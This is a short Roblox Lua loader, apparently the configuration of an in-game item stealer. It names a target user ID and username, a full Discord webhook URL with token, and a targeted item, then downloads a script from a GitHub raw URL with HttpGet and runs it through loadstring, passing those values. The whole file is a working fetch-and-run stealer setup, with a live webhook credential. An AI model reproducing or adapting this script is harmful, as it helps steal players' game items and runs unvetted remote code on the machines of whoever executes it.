local TARGET_ID = 10503543122
local TARGET_USER = "ithinksgame"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1572863697171517531/-yUOEfbMJBJInmThWOozvcb6fZ-W_2mHCJTchs7L6gTfuJjCMH85gp4i9lUSWmNQmCGd"

local TargetBrainrots = {
    ["Dragon Cannelloni"] = true
}

local TargetBaseSkins = {
    
}

local TargetGears = {
    
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)